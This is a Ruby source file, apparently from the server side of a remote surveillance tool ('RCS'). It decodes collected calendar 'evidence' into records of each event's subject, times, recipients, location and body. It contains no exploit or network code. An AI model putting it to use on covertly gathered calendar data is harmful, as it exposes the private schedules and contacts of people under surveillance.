require_relative 'common'
require 'rcs-common/serializer'

module RCS
module CalendarEvidence
  def content
    raise "Not implemented!"
  end

  def generate_content
    raise "Not implemented!"
  end

  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?
      info =  Hash[common_info]
      info[:data] ||= Hash.new

      @calendar = CalendarSerializer.new.unserialize stream

      info[:data][:event] = @calendar.fields[:subject]
      info[:data][:type] = @calendar.fields[:categories]
      info[:data][:begin] = @calendar.start_date.to_i
      info[:data][:end] = @calendar.end_date.to_i
      info[:data][:info] = ""

      trace :debug, "#{info[:data]}"

      unless @calendar.fields[:recipients].nil?
        recipients = @calendar.fields[:recipients]
        unless recipients.empty?
          info[:data][:recipients] = recipients
          info[:data][:info] += "#{recipients}"
        end
      end

      unless @calendar.fields[:location].nil?
        location = @calendar.fields[:location]
        unless location.empty?
          info[:data][:location] = location
          info[:data][:info] += " - " unless info[:data][:info].empty?
          info[:data][:info] += "#{location}"
        end
      end

      unless @calendar.fields[:body].nil?
        body = @calendar.fields[:body]
        unless body.empty?
          info[:data][:body] = body
          info[:data][:info] += " - " unless info[:data][:info].empty?
          info[:data][:info] += "#{body}"
        end
      end

      yield info if block_given?
    end
    :keep_raw
  end
end # ::CalendarEvidence
end # ::RCS
